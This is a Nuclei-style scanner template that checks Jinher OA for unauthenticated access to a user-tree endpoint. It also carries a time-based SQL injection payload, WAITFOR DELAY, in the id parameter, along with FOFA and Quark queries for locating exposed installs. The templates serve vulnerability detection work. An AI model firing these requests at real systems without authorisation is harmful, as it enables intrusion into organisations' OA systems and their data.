id: Jinher-OA-unauth

info:
  name: Jinher OA Unauthorized(金和OA未授权访问+[补充]SQL注入)
  author: linfeng7z
  severity: high
  tags: jinher,oa,unauth,unauthorized
  metadata:
    fofa-query: 'app="金和网络-金和OA"'
    quark-query: 'app="Jinher-OA"'

requests:
  - raw:
      - |
        GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
        Connection: close

      - |
        GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3BWAITFOR+DELAY+%270%3A0%3A5%27+--%20and%201=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_1, 'id') && contains(body_1, 'text') && contains(body_1, 'permissions')"
          - 'duration_2 >= 5'
        condition: and